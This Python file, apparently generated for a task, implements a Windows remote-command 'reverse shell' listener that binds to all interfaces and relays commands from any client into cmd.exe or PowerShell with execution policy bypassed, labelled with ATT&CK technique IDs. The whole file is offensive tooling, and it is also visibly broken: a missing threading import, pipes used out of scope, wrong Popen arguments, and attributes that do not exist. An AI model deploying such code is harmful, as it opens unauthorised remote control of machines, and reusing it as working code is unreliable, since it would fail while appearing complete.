from TASK_001_models import ExecutionResult, ReverseShellConfig
import os
import socket
import subprocess
from typing import Optional, Tuple



class WindowsReverseShell:
    """Windows reverse shell that spawns a command interpreter connected via TCP.
    
    ATT&CK Techniques: T1059.003 (Command and Scripting Interpreter),
                        T1059.004 (PowerShell)
    """

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self._server_socket: Optional[socket.socket] = None
        self._process: Optional[subprocess.Popen] = None
        self._client_socket: Optional[socket.socket] = None

    def start(self) -> ExecutionResult:
        """Start the reverse shell listener.
        
        Returns:
            ExecutionResult with status of the server startup.
        """
        try:
            # Create TCP socket and bind to 0.0.0.0 on specified port
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server_socket.bind(('0.0.0.0', self.config.port))
            self._server_socket.listen(5)

            # Spawn the command interpreter as a child process
            shell_cmd = self._get_shell_command()
            self._process = subprocess.Popen(
                shell_cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                shell=True,
                cwd=os.environ.get('SYSTEMDRIVE', 'C:\\Windows\\System32'),
            )

            # Redirect process I/O through the socket connection
            self._redirect_io()

            return ExecutionResult(
                command_output=f"Reverse shell listener started on 0.0.0.0:{self.config.port}",
                exit_code=0,
                error_messages=[],
            )
        except Exception as e:
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=[str(e)],
            )

    def stop(self) -> ExecutionResult:
        """Stop the reverse shell listener and clean up resources.
        
        Returns:
            ExecutionResult with status of shutdown.
        """
        result = ExecutionResult(
            command_output="Stopping reverse shell...",
            exit_code=0,
            error_messages=[],
        )

        try:
            if self._process is not None and self._process.poll() is None:
                self._process.terminate()
                self._process.wait(timeout=5)
                result.command_output += " Process terminated.\n"
            else:
                result.command_output += " No active process to terminate.\n"

            if self._server_socket is not None and not self._server_socket.closed:
                self._server_socket.close()
                result.command_output += " Server socket closed.\n"

        except Exception as e:
            result.error_messages.append(str(e))
            result.exit_code = -1

        return result

    def _get_shell_command(self) -> Tuple[str, str]:
        """Determine the shell command based on configuration.
        
        Returns:
            Tuple of (cmd.exe_args, powershell_args).
        """
        if self.config.shell_type == 'powershell':
            return ('powershell.exe', '-NoProfile -ExecutionPolicy Bypass')
        else:
            return ('cmd.exe', '/c')

    def _redirect_io(self) -> None:
        """Redirect the child process's stdin/stdout/stderr through the socket.
        
        This allows commands sent to the server socket to be executed by the
        spawned command interpreter, and output to flow back through the same socket.
        """
        if self._process is None or self._server_socket is None:
            return

        # Create a pipe for communication with the process
        stdin_pipe = os.pipe()
        stdout_pipe = os.pipe()

        try:
            # Redirect process stdin to our write end of the pipe
            os.dup2(stdin_pipe[1], 0)
            os.close(stdin_pipe[0])

            # Redirect process stdout to our read end of the pipe
            os.dup2(stdout_pipe[0], 1)
            os.close(stdout_pipe[1])

            # Redirect process stderr to stdout (same pipe)
            os.dup2(stdout_pipe[0], 2)
            os.close(stdout_pipe[1])

        except Exception as e:
            self._process.terminate()
            raise RuntimeError(f"Failed to redirect I/O: {e}") from e

    def handle_client(self, client_socket: socket.socket) -> ExecutionResult:
        """Handle a connected client by forwarding commands to the shell.
        
        Args:
            client_socket: The connected client socket.
            
        Returns:
            ExecutionResult with command output and status.
        """
        result = ExecutionResult(
            command_output="",
            exit_code=0,
            error_messages=[],
        )

        try:
            # Read commands from the client
            buffer = b''
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                buffer += data.decode('utf-8', errors='replace')

                # Process complete lines (commands)
                for line in buffer.split('\n'):
                    if line.strip():
                        self._execute_command(line.strip(), client_socket, result)

            return result

        except Exception as e:
            result.error_messages.append(str(e))
            result.exit_code = -1
            return result

    def _execute_command(self, command: str, client_socket: socket.socket,
                         result: ExecutionResult) -> None:
        """Execute a single command through the spawned shell.
        
        Args:
            command: The command string to execute.
            client_socket: Socket to send output back to.
            result: Accumulated execution results.
        """
        try:
            # Write command to process stdin (via pipe)
            os.write(stdin_pipe[1], f"{command}\n".encode('utf-8'))

            # Read response from process stdout (via pipe)
            output = b''
            while True:
                data = os.read(stdout_pipe[0], 4096)
                if not data:
                    break
                output += data

            result.command_output += f"Command: {command}\nOutput:\n{output.decode('utf-8', errors='replace')}\n\n"

        except Exception as e:
            result.error_messages.append(f"Error executing '{command}': {e}")


class WindowsReverseShellListener:
    """Windows reverse shell listener that spawns cmd.exe or powershell.
    
    This class implements the main entry point for the reverse shell system,
    accepting incoming TCP connections and spawning command interpreters
    to execute remote commands.

    ATT&CK Techniques: T1059.003 (Command and Scripting Interpreter),
                        T1059.004 (PowerShell)
    """

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self._windows_shell = WindowsReverseShell(config)
        self._running = False
        self._threads: list = []

    def start(self) -> ExecutionResult:
        """Start the reverse shell listener.
        
        Returns:
            ExecutionResult with startup status.
        """
        result = self._windows_shell.start()
        if result.exit_code == 0:
            self._running = True
        return result

    def stop(self) -> ExecutionResult:
        """Stop the reverse shell listener.
        
        Returns:
            ExecutionResult with shutdown status.
        """
        result = self._windows_shell.stop()
        self._running = False
        return result

    def listen(self, client_socket: socket.socket) -> ExecutionResult:
        """Listen for and handle incoming commands from a connected client.
        
        Args:
            client_socket: The connected client socket.
            
        Returns:
            ExecutionResult with command execution results.
        """
        return self._windows_shell.handle_client(client_socket)

    def run(self, host: str = '0.0.0.0', port: int = 5522) -> None:
        """Run the reverse shell listener in a loop accepting connections.
        
        Args:
            host: The address to bind to (default: 0.0.0.0).
            port: The port to listen on (default: 5522).
        """
        self._running = True

        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((host, port))
            server_socket.listen(5)

            print(f"[*] Windows Reverse Shell listening on {host}:{port}")

            while self._running:
                try:
                    client_socket, addr = server_socket.accept()
                    print(f"[+] Connection from {addr[0]}:{addr[1]}")

                    # Spawn a new shell for each connection
                    thread = threading.Thread(
                        target=self._handle_connection,
                        args=(client_socket,),
                        daemon=True
                    )
                    thread.start()

                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[-] Accept error: {e}")

        finally:
            if server_socket and not server_socket.closed:
                server_socket.close()

    def _handle_connection(self, client_socket: socket.socket) -> None:
        """Handle a single client connection.
        
        Args:
            client_socket: The connected client socket.
        """
        try:
            result = self._windows_shell.handle_client(client_socket)
            print(f"[*] Connection closed from {client_socket.getpeername()}")

        except Exception as e:
            print(f"[-] Error handling connection: {e}")

        finally:
            client_socket.close()


# Re-export for convenience
__all__ = ['WindowsReverseShell', 'WindowsReverseShellListener']
